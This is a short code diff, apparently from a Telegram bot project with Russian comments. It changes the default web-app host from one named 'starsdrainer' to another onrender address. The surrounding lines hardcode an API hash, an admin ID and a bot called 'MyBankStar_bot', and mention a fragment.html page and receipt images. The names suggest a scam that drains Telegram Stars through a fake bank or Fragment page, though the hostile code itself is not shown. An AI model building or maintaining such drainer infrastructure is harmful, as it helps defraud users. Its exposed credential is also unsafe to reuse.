@@ -12,7 +12,7 @@ const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
 const ADMIN_USER_ID = 1398396668;
 
 // URL, где доступен web-app + статика (fragment.html, stars.jpg, avatar.jpg)
-const WEB_APP_URL = process.env.WEB_APP_URL || 'https://starsdrainer.onrender.com';
+const WEB_APP_URL = process.env.WEB_APP_URL || 'https://eeee-2bsj.onrender.com';
 const PUBLIC_BASE_URL = process.env.PUBLIC_BASE_URL || WEB_APP_URL; // для inline-картинок чеков
 const BOT_USERNAME = 'MyBankStar_bot'; // без @
 
